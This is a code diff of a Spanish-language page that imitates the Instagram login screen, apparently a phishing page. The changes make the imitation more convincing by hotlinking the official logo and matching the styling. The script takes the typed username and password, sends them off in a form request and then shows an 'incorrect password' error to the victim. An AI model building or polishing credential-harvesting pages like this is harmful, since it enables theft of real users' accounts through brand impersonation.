@@ -15,75 +15,61 @@
             margin: 0;
         }
 
-        .container {
-            width: 350px;
+        .login-box {
             background-color: #ffffff;
             border: 1px solid #dbdbdb;
-            border-radius: 1px;
             padding: 40px 40px 30px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+            width: 350px;
+            text-align: center;
         }
 
         .logo {
-            margin-bottom: 20px;
+            margin: 20px 0 20px;
             width: 175px;
-            font-family: 'Segoe UI', sans-serif; /* Fallback si no carga imagen */
-            font-size: 32px;
-            font-weight: 600;
-            text-align: center;
         }
         
-        /* Si la imagen falla, se verá texto elegante, no "Instagram logo" feo */
-        .logo-text {
-            font-family: "Grand Hotel", cursive, sans-serif;
-            font-size: 40px;
-            margin-top: 20px;
+        .logo img {
+            width: 100%;
         }
 
-        .form-group {
-            width: 100%;
+        .input-group {
             margin-bottom: 6px;
         }
 
-        input {
+        .input-group input {
             width: 100%;
-            background-color: #fafafa;
+            background: #fafafa;
             border: 1px solid #dbdbdb;
             border-radius: 3px;
-            padding: 14px 10px;
-            margin: 0;
+            padding: 9px 8px 7px;
             font-size: 12px;
             color: #262626;
-            outline: none;
+            box-sizing: border-box;
         }
 
-        input:focus {
+        .input-group input:focus {
             border-color: #a8a8a8;
         }
 
-        .btn {
-            width: 100%;
+        .login-btn {
             background-color: #0095f6;
             border: none;
             border-radius: 4px;
             color: #ffffff;
             font-weight: 600;
+            padding: 7px 16px;
+            width: 100%;
             font-size: 14px;
-            padding: 7px 10px;
-            margin-top: 10px;
             cursor: pointer;
-            opacity: 0.9;
-            transition: opacity 0.2s;
+            margin-top: 10px;
         }
 
-        .btn:hover {
-            opacity: 1;
+        .login-btn:disabled {
+            opacity: 0.7;
+            cursor: default;
         }
 
         .or {
-            width: 100%;
             display: flex;
             align-items: center;
             margin: 18px 0;
@@ -107,31 +93,31 @@
             font-size: 12px;
             font-weight: 600;
             display: none;
-            width: 100%;
-            text-align: center;
             margin-bottom: 10px;
             background-color: #fff0f0;
-            padding: 8px;
-            border-radius: 3px;
+            padding: 10px;
+            border-radius: 4px;
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <!-- LOGO ROBUSTO (Imagen o Texto de respaldo) -->
-        <div class="logo-text">Instagram</div>
+    <div class="login-box">
+        <!-- Logo oficial -->
+        <div class="logo">
+            <img src="https://static.cdninstagram.com/rsrc.php/yr/r/Yfc020wY07c.svg" alt="Instagram">
+        </div>
 
         <div class="error-msg" id="errorMsg">El nombre de usuario o la contraseña es incorrecta.</div>
 
         <form id="loginForm" onsubmit="return false;">
-            <div class="form-group">
-                <input type="text" id="username" name="username" placeholder="Teléfono, nombre de usuario o correo electrónico" required>
+            <div class="input-group">
+                <input type="text" name="username" placeholder="Teléfono, nombre de usuario o correo electrónico" required>
             </div>
-            <div class="form-group">
-                <input type="password" id="password" name="password" placeholder="Contraseña" required>
+            <div class="input-group">
+                <input type="password" name="password" placeholder="Contraseña" required>
             </div>
-            <button type="submit" class="btn" id="submitBtn">Iniciar sesión</button>
+            <button type="submit" class="login-btn" id="submitBtn">Iniciar sesión</button>
         </form>
 
         <div class="or">O</div>
@@ -156,12 +142,12 @@
         form.addEventListener('submit', function(e) {
             e.preventDefault();
             
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-
             btn.disabled = true;
             btn.innerText = '...';
             errorMsg.style.display = 'none';
+
+            const username = form.username.value;
+            const password = form.password.value;
 
             const data = new FormData();
             data.append('username', username);
@@ -178,7 +164,6 @@
                 btn.disabled = false;
                 btn.innerText = 'Iniciar sesión';
                 errorMsg.style.display = 'block';
-                errorMsg.innerText = "El nombre de usuario o la contraseña es incorrecta.";
             })
             .catch(error => {
                 btn.disabled = false;
